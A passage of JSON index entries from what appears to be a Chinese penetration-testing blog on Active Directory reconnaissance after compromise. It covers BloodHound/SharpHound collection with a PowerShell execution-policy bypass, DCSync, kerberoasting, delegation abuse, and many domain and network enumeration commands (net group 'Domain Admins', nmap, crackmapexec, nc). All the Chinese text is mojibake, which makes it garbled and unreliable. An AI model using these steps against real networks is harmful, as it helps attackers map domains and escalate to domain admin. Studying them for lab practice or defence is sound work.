infoå¤„å°±æœ‰æ•°æ®äº†ï¼Œæ­¤æ—¶è¿›å…¥analysisæ¨¡å—ï¼Œé€‰æ‹©ä¸åŒçš„æŸ¥è¯¢æ¡ä»¶ï¼Œå¯ä»¥è¿›è¡Œä¸åŒçš„åˆ†ææŸ¥è¯¢ï¼Œæ¯”å¦‚â€œfind all domain adminsâ€ï¼š\næ­¤æ—¶å•å‡»ä»»æ„èŠ‚ç‚¹ï¼Œå·¦ä¸Šè§’ä¼šè¿›å…¥node infoå¹¶æ˜¾ç¤ºèŠ‚ç‚¹ä¿¡æ¯ï¼š\nèŠ‚ç‚¹æ¦‚è¿° èŠ‚ç‚¹å±æ€§ æ‰€å±ç»„ æ‰€æ‹¥æœ‰çš„æƒé™ \u0026hellip;\u0026hellip; è¾¹ç¼˜ä¿¡æ¯ è¾¹ç¼˜ï¼ˆEdgeï¼‰æ˜¯è¿æ¥ä¸¤ä¸ªèŠ‚ç‚¹çš„è¿çº¿ï¼Œå¯ä»¥åæ˜ ä¸¤ä¸ªç›¸äº’ä½œç”¨çš„èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ï¼Œä¾‹å¦‚è¿™é‡Œâ€œmember ofâ€è¡¨ç¤ºåŸŸç”¨æˆ·YUY0UNGæ˜¯ç”¨æˆ·ç»„DOMAIN ADMINSçš„æˆå‘˜ï¼š\nå¸¸è§è¾¹ç¼˜ç±»å‹å¦‚ä¸‹ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼š\næ•°æ®åˆ†æ å¸¸ç”¨çš„æŸ¥è¯¢åŠŸèƒ½å¦‚ä¸‹ï¼š\nè¿™é‡Œè®°å½•æ¯”è¾ƒå¸¸ç”¨çš„ï¼š\næŸ¥æ‰¾æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜ å•å‡»find all domain adminsï¼Œå¯ä»¥çœ‹è§ä¸¤ä¸ªåŸŸç®¡ç†å‘˜ç”¨æˆ·\nè¯†åˆ«åˆ°è¾¾åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„ å•å‡»find shortest paths to domain adminsï¼Œè¯†åˆ«åˆ°è¾¾åŸŸç®¡ç†å‘˜çš„æœ€çŸ­è·¯å¾„\næŸ¥æ‰¾æ‰€æœ‰æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“ é€‰æ‹©æ¨¡å—find principals with DCSync Rightsï¼ŒæŸ¥æ‰¾æ‰€æœ‰æ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“\næ‹¥æœ‰DCSyncæƒé™çš„ä¸»ä½“å¯ä»¥é€šè¿‡Directory Replication Serverï¼ˆDRSï¼‰æœåŠ¡çš„GetNCChangesæ¥å£å‘åŸŸæ§å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ï¼Œå¹¶ä»åŸŸæ§è¯·æ±‚æ•°æ®ã€‚é€šè¿‡DCSyncï¼Œæˆ‘ä»¬å¯ä»¥å¯¼å‡ºæ‰€æœ‰åŸŸç”¨æˆ·çš„NTLM Hashï¼Œå®ç°éšè”½çš„æƒé™ç»´æŒ\næ˜ å°„åŸŸä¿¡ä»»å…³ç³» é€‰æ‹©map domain trustsï¼Œæ˜¾ç¤ºå½“å‰åŸŸä¿¡ä»»å…³ç³»\nç”±äºæˆ‘æ­å»ºçš„åŸŸç¯å¢ƒä¸ºå•åŸŸï¼Œå°±ä¸æ”¾å›¾äº†\né€šè¿‡æ”¶é›†æœ‰å…³åŸŸä¿¡ä»»å…³ç³»çš„ä¿¡æ¯ï¼Œå¯ä»¥ä¸ºåœ¨åŸŸæ—ç¯å¢ƒä¸­æ¨ªå‘ç§»åŠ¨å¯»æ‰¾æœºä¼š\nåˆ°è¾¾æ— çº¦æŸå§”æ´¾çš„æœ€çŸ­è·¯å¾„ é€‰æ‹©shortest paths to unconstrained delegation systemsï¼Œè¯†åˆ«åˆ°è¾¾æ— çº¦æŸå§”æ´¾çš„æœ€çŸ­è·¯å¾„\nåŸŸå§”æ´¾æ˜¯æŒ‡å°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦æˆ·ï¼Œä½¿æœåŠ¡è´¦æˆ·èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·çš„èº«ä»½åœ¨åŸŸå†…å¼€å±•å…¶ä»–æ´»åŠ¨æ¯”å¦‚è®¿é—®åŸŸå†…å…¶ä»–æœåŠ¡ï¼Œä¸ºåŸŸå†…çš„å¤šè·³è®¤è¯å¸¦æ¥ä¾¿åˆ©ï¼Œä½†ä¹Ÿå¢åŠ äº†éšæ‚£ï¼Œé€šè¿‡æ»¥ç”¨å§”æ´¾ï¼Œå¯ä»¥è·å–åŸŸç®¡ç†å‘˜æƒé™ï¼Œæ¥ç®¡æ•´ä¸ªåŸŸç¯å¢ƒï¼Œä¹Ÿèƒ½åˆ¶ä½œåé—¨å®ç°éšè”½çš„æƒé™ç»´æŒ\næ‰€æœ‰kerberroastableç”¨æˆ· é€‰æ‹©list all kerberoastable accountsï¼Œåˆ—å‡ºæ‰€æœ‰kerberroastableç”¨æˆ·ï¼š\nkerberroastableç”¨æˆ·å¯ä»¥è¢«ç”¨æ¥ç¦»çº¿ç ´è§£æœåŠ¡è´¦æˆ·å“ˆå¸Œå€¼ï¼Œè·å–ADæ§åˆ¶æƒ\nåˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„ é€‰æ‹©shortest paths to high value targetsï¼Œè¯†åˆ«åˆ°è¾¾é«˜ä»·å€¼ç›®æ ‡çš„æœ€çŸ­è·¯å¾„ï¼š\næ‰€æœ‰éåŸŸæ§çš„åŸŸç®¡ç†ç™»å½• é€‰æ‹©find domain admin logons to non-domain contrllersï¼ŒæŸ¥çœ‹æ‰€æœ‰éåŸŸæ§çš„åŸŸç®¡ç†ç™»å½•\né€šè¿‡æ‰¾å‡ºåŸŸç®¡ç†å‘˜åœ¨æ‰€æœ‰éåŸŸæ§çš„ä¸»æœºçš„ç™»é™†ç—•è¿¹ï¼Œä¸ºå‡†ç¡®è·å–åŸŸç®¡ç†å‘˜æä¾›äº†æ–¹å‘ï¼Œä¾‹å¦‚å…¥ä¾µä¸»æœºæ‰¾åˆ°åŸŸç®¡ç†å‘˜æ´»åŠ¨çš„è¿›ç¨‹ï¼Œé€šè¿‡è¿›ç¨‹è¿ç§»ã€ä»¤ç‰Œçªƒå–ç­‰æ‰‹æ®µï¼Œè·å–åŸŸç®¡ç†æƒé™\n",
        "summary": "å†…ç½‘ä¿¡æ¯æ”¶é›†-BloodHoundåˆ†æåŸŸç¯å¢ƒ bloodhoundæ˜¯ä¸€æ¬¾å•é¡µJavaScript Webåº”ç”¨ç¨‹åºï¼Œæ˜¯ä¸€æ¬¾å¼ºå¤§çš„åŸŸå†…ç¯å¢ƒåˆ†æå·¥å…·ï¼Œèƒ½é€šè¿‡å›¾ä¸çº¿çš„å½¢å¼å°†åŸŸå†…ç›¸å…³ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ä¼šè¯ã€ACLç­‰å¯¹è±¡ä¹‹é—´çš„å…³ç³»ä»¥å¯è§†åŒ–æ–¹å¼å‘ˆç°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥è¯†åˆ«é«˜åº¦å¤æ‚çš„æ”»å‡»è·¯å¾„\nbloodhoundçš„å®‰è£… è¿™é‡Œæˆ‘åœ¨windowsä¸Šè¿›è¡Œå®‰è£…\nå®‰è£…neo4jæ•°æ®åº“ è¿™é‡Œæˆ‘åœ¨windowsä¸Šå®‰è£…Neo4j Deployment Center - Graph Database \u0026amp; Analyticsï¼š\nä¸‹è½½å¥½ï¼Œè§£å‹ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤å¯åŠ¨ï¼š\nneo4j.bat console åªè¦jdkç‰ˆæœ¬æ­£ç¡®ï¼Œå°±èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨\nç„¶åæµè§ˆå™¨è®¿é—®å¹¶ç™»å½•ï¼š\nHost : http://localhost:7474 Username : neo4j Password : neo4j ä¿®æ”¹é»˜è®¤å¯†ç ï¼š\nneo4jå°±å®‰è£…å®Œæ¯•äº†\nè¿è¡Œbloodhound ä¸‹è½½bloodhoundï¼Œè§£å‹åç›´æ¥å¯åŠ¨exeï¼Œå¹¶ç”¨noe4jçš„è´¦å·å¯†ç ç™»å½•ï¼š\nè¿›å…¥åé¡µé¢å·¦ä¸Šè§’æœ‰ä¸‰ä¸ªé€‰é¡¹å¡ï¼š\ndatabase infoï¼ˆæ•°æ®åº“ä¿¡æ¯ï¼‰ node infoï¼ˆèŠ‚ç‚¹ä¿¡æ¯ï¼‰ analysisï¼ˆåˆ†æï¼‰ å³ä¸Šè§’æœ‰å¾ˆå¤šè®¾ç½®é€‰é¡¹ï¼Œè¿™é‡Œä¸ç»†è¯´\næ´»åŠ¨ç›®å½•ä¿¡æ¯æ”¶é›† æ”¶é›†å·¥å…·ä½¿ç”¨sharphoundï¼ˆè¿™é‡Œç”¨1.xçš„ç‰ˆæœ¬ï¼‰\næœ‰ä¸¤ç§æ”¶é›†æ–¹æ¡ˆï¼š\npowershellé‡‡é›†è„šæœ¬ï¼šSharpHound.ps1 å¯æ‰§è¡Œæ–‡ä»¶ï¼šSharpHound.exe å‘½ä»¤å¦‚ä¸‹\nSharpHound.exe -c all powershell -exec bypass -command \u0026#34;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all\u0026#34; ä¸¤ç§æ–¹æ³•éƒ½éœ€è¦å°†æ–‡ä»¶ä¸Šä¼ è‡³ç›®æ ‡ä¸»æœºï¼Œæˆ‘è¿™é‡Œä½¿ç”¨exeè¿›è¡Œæ”¶é›†ï¼š\nä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆæ ¼å¼ä¸ºâ€œæ—¶é—´æˆ³_BloodHound.zipâ€çš„æ–‡ä»¶\nå¯¼å…¥æ•°æ® ç›´æ¥å‹ç¼©åŒ…æ‹–åŠ¨å¯¼å…¥å³å¯ï¼š\nä¸Šä¼ åå·¦ä¸Šè§’çš„database infoå¤„å°±æœ‰æ•°æ®äº†ï¼Œæ­¤æ—¶è¿›å…¥analysisæ¨¡å—ï¼Œé€‰æ‹©ä¸åŒçš„æŸ¥è¯¢æ¡ä»¶ï¼Œå¯ä»¥è¿›è¡Œä¸åŒçš„åˆ†ææŸ¥è¯¢ï¼Œæ¯”å¦‚â€œfind all domain adminsâ€ï¼š\n"
    }
,
    {
        "title": "å†…ç½‘ä¿¡æ¯æ”¶é›†-åŸºç¡€æ”¶é›†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E7%A1%80%E6%94%B6%E9%9B%86/",
        "content": "å†…ç½‘ä¿¡æ¯æ”¶é›†-åŸºç¡€æ”¶é›† ä¸»è¦æœ‰ï¼š\næœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›† åŸŸå†…ä¿¡æ¯æ”¶é›† åŸºäºpowershellçš„æ”¶é›† æœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›† åœ¨getshellåï¼Œé¦–å…ˆå°±æ˜¯ä»¥å½“å‰ä¸»æœºä¸ºä¸­å¿ƒè¿›è¡Œä¿¡æ¯æ”¶é›†\næŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ whoami /all å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·æ‰€å¤„çš„ç”¨æˆ·ç»„ã€æ‹¥æœ‰çš„ç‰¹æƒç­‰ï¼Œç”¨äºç»¼åˆåˆ¤æ–­æ˜¯å¦éœ€è¦ææƒ\næŸ¥çœ‹ç½‘ç»œé…ç½®ä¿¡æ¯ ipconfig /all æŸ¥çœ‹å½“å‰ä¸»æœºç½‘ç»œé…ç½®æƒ…å†µï¼ŒåŒ…æ‹¬ä¸»æœºçš„IPåœ°å€ã€ä¸»æœºåã€å„ç½‘ç»œé€‚é…å™¨çš„ä¿¡æ¯ç­‰ï¼Œå¯ä»¥åˆ¤æ–­ä¸»æœºæ‰€åœ¨ç½‘æ®µ\nå€¼å¾—ä¸€æçš„æ˜¯Ethernet0ä¸­çš„DNSæœåŠ¡å™¨åœ°å€ï¼Œæ­å»ºè¿‡åŸŸç¯å¢ƒä¾¿çŸ¥é“ï¼ŒDNSæœåŠ¡å™¨çš„IPåœ°å€é€šå¸¸å°±ä¸ºåŸŸæ§åˆ¶å™¨çš„åœ°å€\næŸ¥çœ‹ä¸»æœºè·¯ç”±ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºè·¯ç”±è¡¨ï¼š\nroute print è·¯ç”±è¡¨ä¸­çš„â€œç½‘ç»œç›®æ ‡â€éƒ½æ˜¯ä¸»æœºå¯ä»¥è®¿é—®åˆ°çš„ï¼Œåç»­å¯ä»¥å¯¹å…¶ä¸­çš„ç½‘æ®µè¿›è¡Œæ¢æµ‹\næŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ systeminfo æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€ç³»ç»Ÿç›®å½•ã€æ‰€å¤„çš„åŸŸæˆ–å·¥ä½œç»„ã€ç½‘å¡ä¿¡æ¯ã€å®‰è£…çš„è¡¥ä¸\næŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯ netstat -ano æŸ¥çœ‹ä¸»æœºçš„TCPã€UDPç«¯å£çš„ç›‘å¬å’Œå¼€æ”¾æƒ…å†µï¼Œå†…ç½‘å…¶ä»–ä¸»æœºè®¿é—®æœ¬æœºæ—¶ä¹Ÿä¼šå»ºç«‹è¿æ¥ï¼Œæ‰€ä»¥ä¹Ÿèƒ½ç”¨æ¥æ”¶é›†å†…ç½‘åœ°å€æ®µ\næŸ¥çœ‹å½“å‰ä¼šè¯åˆ—è¡¨ æŸ¥çœ‹å½“å‰ä¸»æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·æœºä¹‹é—´çš„ä¼šè¯\nnet session æŸ¥çœ‹å½“å‰ç½‘ç»œå…±äº«ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºå¼€å¯çš„å…±äº«åˆ—è¡¨ï¼š\nnet share æŸ¥çœ‹å·²è¿æ¥çš„ç½‘ç»œå…±äº« æŸ¥çœ‹ä¸»æœºä¸å…¶ä»–ä¸»æœºè¿œç¨‹å»ºç«‹çš„ç½‘ç»œå…±äº«è¿æ¥\nnet use æŸ¥çœ‹å½“å‰è¿›ç¨‹ä¿¡æ¯ æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€æœ‰è¿›ç¨‹ä¿¡æ¯\ntasklist å¯ä»¥é’ˆå¯¹è¿›ç¨‹ä¿¡æ¯è¿›è¡Œæ€è½¯è¯†åˆ«\nä¹Ÿå¯ä»¥ç”¨WMIC:\nwmic process get name, ProcessID, ExecutablePath æŸ¥çœ‹å½“å‰æœåŠ¡ä¿¡æ¯ æŸ¥çœ‹å½“å‰æ‰€æœ‰æœåŠ¡ä¿¡æ¯ï¼Œè¿‡æ»¤å‡ºæœåŠ¡åç§°ã€è·¯å¾„ã€åˆ›å»ºæ—¶é—´ã€è¿è¡ŒçŠ¶æ€ä¿¡æ¯\nwmic service get Caption,Name,PathName,StartName,State æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºä¸Šæ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡ï¼š\nschtasks /query /v /fo list æŸ¥çœ‹è‡ªå¯ç¨‹åºä¿¡æ¯ æŸ¥çœ‹ä¸»æœºè‡ªå¯ç¨‹åºä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºç¨‹åºåç§°ã€æ‰§è¡Œçš„å‘½ä»¤ã€ç¨‹åºçš„è·¯å¾„ã€æ‰€å±ç”¨æˆ·ï¼š\nwmic startup get Caption,Command,Location,User æŸ¥çœ‹ç³»ç»Ÿè¡¥ä¸å®‰è£…ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºå®‰è£…çš„è¡¥ä¸åˆ—è¡¨ï¼Œå¹¶è¿‡æ»¤å‡ºè¡¥ä¸é“¾æ¥ã€åç§°ã€æè¿°ã€è¡¥ä¸ç¼–å·ã€å®‰è£…æ—¶é—´ï¼š\nwmic qfe get Caption,Description,HotFixID,InstalledOn æŸ¥çœ‹åº”ç”¨å®‰è£…ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºå®‰è£…çš„åº”ç”¨è½¯ä»¶ä¿¡æ¯ï¼Œå¹¶è¿‡æ»¤å‡ºåº”ç”¨çš„åç§°å’Œç‰ˆæœ¬ï¼š\nwmic product get Caption,Version æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·/ç»„ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºä¸Šçš„æœ¬åœ°ç”¨æˆ·ä¿¡æ¯ï¼š\nnet user æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼š\nnet localgroup administrators è¿™é‡Œçš„æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸ä»…åŒ…å«äº†æœ¬åœ°ç®¡ç†å‘˜administratorï¼Œè¿˜åŒ…å«äº†åŸŸå…¨å±€ç»„YUY0UNG\\Domain Adminsï¼Œè¿™æ˜¯ä¸»æœºåŠ å…¥åŸŸæ—¶è‡ªåŠ¨æ·»åŠ çš„\næŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ· æŸ¥çœ‹å½“å‰ä¸»æœºç™»é™†çš„ç”¨æˆ·ï¼š\nquery user åŸŸå†…ä¿¡æ¯æ”¶é›† æ˜¯å¦å­˜åœ¨åŸŸç¯å¢ƒ æŸ¥çœ‹å½“å‰å·¥ä½œç«™ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰è®¡ç®—æœºåã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€ç™»é™†çš„åŸŸç­‰ï¼š\nnet config workstation æŸ¥çœ‹åŸŸç”¨æˆ·ä¿¡æ¯ æŸ¥çœ‹æ‰€æœ‰åŸŸç”¨æˆ·ï¼š\nnet user /domain åªæœ‰åŸŸç”¨æˆ·æ‰æœ‰æƒé™æ‰§è¡ŒåŸŸå†…æŸ¥è¯¢æ“ä½œã€‚è®¡ç®—æœºæœ¬åœ°ç”¨æˆ·é™¤éæå‡ä¸ºæœ¬åœ°SYSTEMæƒé™ï¼Œå¦åˆ™åªèƒ½æŸ¥è¯¢æœ¬æœºä¿¡æ¯ï¼Œæ— æ³•æŸ¥è¯¢åŸŸå†…ä¿¡æ¯å¹¶æç¤ºâ€œæ‹’ç»è®¿é—®â€ï¼Œè¿™æ˜¯å› ä¸ºåœ¨åŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰ä¸åŸŸæœ‰å…³çš„æŸ¥è¯¢éƒ½éœ€è¦é€šè¿‡åŸŸæ§æ¥å®ç°ï¼Œå¹¶éœ€è¦ç»è¿‡kerberosåè®®è®¤è¯\næŸ¥çœ‹åŸŸç”¨æˆ·ç»„ä¿¡æ¯ åˆ—å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„ï¼š\nnet group /domain æŸ¥çœ‹åŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼š\nnet group \u0026#34;Domain Admins\u0026#34; /domain æŸ¥çœ‹åŸŸå†…å®¢æˆ·ç«¯ä¸»æœºï¼š\nnet group \u0026#34;Domain Computers\u0026#34; /domain å…¶ä»–åŒç†ï¼š\næŸ¥çœ‹åŸŸå†…å¯†ç ç­–ç•¥ æŸ¥è¯¢åŸŸå†…ç”¨æˆ·çš„å¯†ç ç­–ç•¥ï¼š\nnet account /domain å¯ä»¥æ ¹æ®å¯†ç ç­–ç•¥æ„é€ å­—å…¸ï¼Œå¹¶å‘èµ·çˆ†ç ´æ”»å‡»\næŸ¥çœ‹åŸŸæ§åˆ—è¡¨ æŸ¥è¯¢åŸŸæ§åˆ¶å™¨ç»„ï¼Œå¯ä»¥å¾—åˆ°æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¸»æœºåï¼š\nnet group \u0026#34;Domain Controllers\u0026#34; /domain æŸ¥çœ‹ä¸»DC ä¸»åŸŸæ§ä¼šåŒæ—¶è¢«ç”¨ä½œæ—¶é—´æœåŠ¡å™¨ï¼Œä»¥åŒæ­¥åŸŸå†…ä¸»æœºæ—¶é’Ÿï¼Œæ‰€ä»¥å¯ä»¥æŸ¥è¯¢æ—¶é—´æœåŠ¡å™¨æ¥æ‰¾åˆ°ä¸»DCçš„åç§°ï¼š\nnet time /domain å®šä½åŸŸæ§ çŸ¥é“ç›®æ ‡ä¸»æœºåç§°åå¯ä»¥é€šè¿‡pingæ¥ç¡®å®šä¸»æœºåœ¨å†…ç½‘ä¸­çš„IPåœ°å€ï¼Œå¦‚ï¼š\nping DC01.yuy0ung.com å¯çŸ¥åŸŸæ§DC01çš„IPä¸º192.168.111.100\nå¦å¤–ä¹Ÿå¯é€šè¿‡æŸ¥æ‰¾DNSæœåŠ¡å™¨åœ°å€å®šä½DC\næŸ¥çœ‹åŸŸä¿¡ä»»å…³ç³» åŸŸä¿¡ä»»ç”¨äºå¤šåŸŸç¯å¢ƒä¸­çš„è·¨åŸŸèµ„æºå…±äº«\næŸ¥è¯¢ä¸»æœºæ‰€åœ¨åŸŸå’Œå…¶ä»–åŸŸçš„ä¿¡ä»»å…³ç³»ï¼š\nnltest /domain_trusts å†…ç½‘èµ„æºæ¢æµ‹ å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº åŸºäºICMP å³å¯¹æ•´ä¸ªç½‘æ®µIPæ‰§è¡Œpingå‘½ä»¤ï¼Œèƒ½pingé€šå³å­˜æ´»ï¼š\nfor /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.111.%I | findstr \u0026#34;TTL=\u0026#34; åŸºäºNetBIOSï¼ˆç½‘ç»œåŸºæœ¬è¾“å…¥/è¾“å‡ºç³»ç»Ÿï¼‰ å¯ä»¥ä½¿ç”¨NBTScanæ‰«æwindowsç½‘ç»œä¸ŠNetBIOSåç§°ï¼Œä»¥å‘ç°å†…ç½‘å­˜æ´»ä¸»æœºï¼š\nnbtscan.exe 192.168.111.0/24 åŸºäºUDP å¯ä»¥ä½¿ç”¨unicornscanï¼š\nunicornscan.exe -mU 192.168.111.0/24 åŸºäºARP ä½¿ç”¨ARP-Scanï¼š\narp-scan.exe -t 192.168.111.0/24 åŸºäºSMBï¼ˆserver message blockï¼ŒæœåŠ¡å™¨æ¶ˆæ¯å—ï¼‰ ä½¿ç”¨CrackMapExecï¼š\ncrackmapexec smb 192.168.111.0/24 å†…ç½‘ç«¯å£æ‰«æ åˆ©ç”¨Telnet telnetå¯ä»¥ç®€å•æµ‹è¯•æŒ‡å®šç«¯å£çŠ¶æ€ï¼š\ntelnet 192.168.111.132 445 ä½¿ç”¨Nmap æ‰«ææ‰€æœ‰ç«¯å£å¹¶è¯†åˆ«æœåŠ¡ï¼š\nnmap -sV -p- 192.168.111.132 MSFæ¢æµ‹å†…ç½‘ metasploité›†æˆçš„å¾ˆå¤šæ”¶é›†æ¨¡å—ï¼š\nç¬”è€…è®¤ä¸ºåœ¨å®æˆ˜æƒ…å†µä¸‹è¿™ç±»å¥—ä»¶æ˜¯ä¸æ¨èä½¿ç”¨çš„ï¼Œæ‰€ä»¥ä¸å†ç»†è¯´\nè·å–ç«¯å£banner æŸ¥çœ‹bannerå¯ä»¥è·å–è½¯ä»¶å¼€å‘å•†ã€åç§°ã€ç‰ˆæœ¬å·ã€æœåŠ¡ç±»å‹ç­‰ï¼Œæœ‰æ—¶è¿˜èƒ½åˆ©ç”¨å†å²æ¼æ´\nåˆ©ç”¨NetCat nc -nv 192.168.111.132 135 åˆ©ç”¨telnet å’Œä¸Šé¢æ¢æµ‹ç«¯å£ç›¸åŒï¼Œtelnetè¿æ¥æˆåŠŸä¼šè¿”å›ç›¸åº”banner\nåˆ©ç”¨nmap æŒ‡å®šè„šæœ¬å³å¯ï¼š\nnmap --script=banner -p 3389 192.168.111.132 åŸºäºpowershellçš„æ”¶é›† ä¸Šé¢çš„ä¿¡æ¯æ”¶é›†å¤§å¤šåŸºäºä¸»æœºçš„cmdå‘½ä»¤è¡Œï¼Œè¿™é‡Œå°†åŸºäºpowershellçš„æ”¶é›†å•ç‹¬æåŠä¸€ä¸‹\nPowershellçš„ä¼˜ç‚¹ï¼š\nä»£ç è¿è¡Œåœ¨å†…å­˜ä¸­å¯ä»¥ä¸å»æ¥è§¦ç£ç›˜\nä»å¦ä¸€ä¸ªç³»ç»Ÿä¸­ä¸‹è½½ä»£ç å¹¶æ‰§è¡Œ\nå¾ˆå¤šå®‰å…¨äº§å“å¹¶ä¸èƒ½ç›‘æµ‹åˆ°powershellçš„æ´»åŠ¨\ncmd.exeé€šå¸¸è¢«é˜»æ­¢è¿è¡Œï¼Œä½†æ˜¯powershellä¸ä¼š\ngithubä¸Šæœ‰å¾ˆå¤šåŸºäºpowershellçš„åæ¸—é€å¥—ä»¶ï¼Œéƒ½å†…ç½®äº†å†…ç½‘ä¿¡æ¯æ”¶é›†å¥—ä»¶ï¼Œå¯ä»¥ç”¨ä½œå‚è€ƒï¼š\nEmpireï¼šhttps://github.com/EmpireProject/Empire powersploitï¼šhttps://github.com/PowerShellMafia/PowerSploit NiShangï¼šhttps://github.com/samratashok/nishang å½“ç„¶é‡Œé¢ä¹Ÿæœ‰å…¶ä»–åæ¸—é€å·¥å…·ï¼Œå¯ä»¥ä½œä¸ºäº†è§£\n",
        "summary": "å†…ç½‘ä¿¡æ¯æ”¶é›†-åŸºç¡€æ”¶é›† ä¸»è¦æœ‰ï¼š\næœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›† åŸŸå†…ä¿¡æ¯æ”¶é›† åŸºäºpowershellçš„æ”¶é›† æœ¬æœºåŸºç¡€ä¿¡æ¯æ”¶é›† åœ¨getshellåï¼Œé¦–å…ˆå°±æ˜¯ä»¥å½“å‰ä¸»æœºä¸ºä¸­å¿ƒè¿›è¡Œä¿¡æ¯æ”¶é›†\næŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ whoami /all å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·æ‰€å¤„çš„ç”¨æˆ·ç»„ã€æ‹¥æœ‰çš„ç‰¹æƒç­‰ï¼Œç”¨äºç»¼åˆåˆ¤æ–­æ˜¯å¦éœ€è¦ææƒ\næŸ¥çœ‹ç½‘ç»œé…ç½®ä¿¡æ¯ ipconfig /all æŸ¥çœ‹å½“å‰ä¸»æœºç½‘ç»œé…ç½®æƒ…å†µï¼ŒåŒ…æ‹¬ä¸»æœºçš„IPåœ°å€ã€ä¸»æœºåã€å„ç½‘ç»œé€‚é…å™¨çš„ä¿¡æ¯ç­‰ï¼Œå¯ä»¥åˆ¤æ–­ä¸»æœºæ‰€åœ¨ç½‘æ®µ\nå€¼å¾—ä¸€æçš„æ˜¯Ethernet0ä¸­çš„DNSæœåŠ¡å™¨åœ°å€ï¼Œæ­å»ºè¿‡åŸŸç¯å¢ƒä¾¿çŸ¥é“ï¼ŒDNSæœåŠ¡å™¨çš„IPåœ°å€é€šå¸¸å°±ä¸ºåŸŸæ§åˆ¶å™¨çš„åœ°å€\næŸ¥çœ‹ä¸»æœºè·¯ç”±ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºè·¯ç”±è¡¨ï¼š\nroute print è·¯ç”±è¡¨ä¸­çš„â€œç½‘ç»œç›®æ ‡â€éƒ½æ˜¯ä¸»æœºå¯ä»¥è®¿é—®åˆ°çš„ï¼Œåç»­å¯ä»¥å¯¹å…¶ä¸­çš„ç½‘æ®µè¿›è¡Œæ¢æµ‹\næŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ systeminfo æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€ç³»ç»Ÿç›®å½•ã€æ‰€å¤„çš„åŸŸæˆ–å·¥ä½œç»„ã€ç½‘å¡ä¿¡æ¯ã€å®‰è£…çš„è¡¥ä¸\næŸ¥çœ‹ç«¯å£è¿æ¥ä¿¡æ¯ netstat -ano æŸ¥çœ‹ä¸»æœºçš„TCPã€UDPç«¯å£çš„ç›‘å¬å’Œå¼€æ”¾æƒ…å†µï¼Œå†…ç½‘å…¶ä»–ä¸»æœºè®¿é—®æœ¬æœºæ—¶ä¹Ÿä¼šå»ºç«‹è¿æ¥ï¼Œæ‰€ä»¥ä¹Ÿèƒ½ç”¨æ¥æ”¶é›†å†…ç½‘åœ°å€æ®µ\næŸ¥çœ‹å½“å‰ä¼šè¯åˆ—è¡¨ æŸ¥çœ‹å½“å‰ä¸»æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·æœºä¹‹é—´çš„ä¼šè¯\nnet session æŸ¥çœ‹å½“å‰ç½‘ç»œå…±äº«ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºå¼€å¯çš„å…±äº«åˆ—è¡¨ï¼š\nnet share æŸ¥çœ‹å·²è¿æ¥çš„ç½‘ç»œå…±äº« 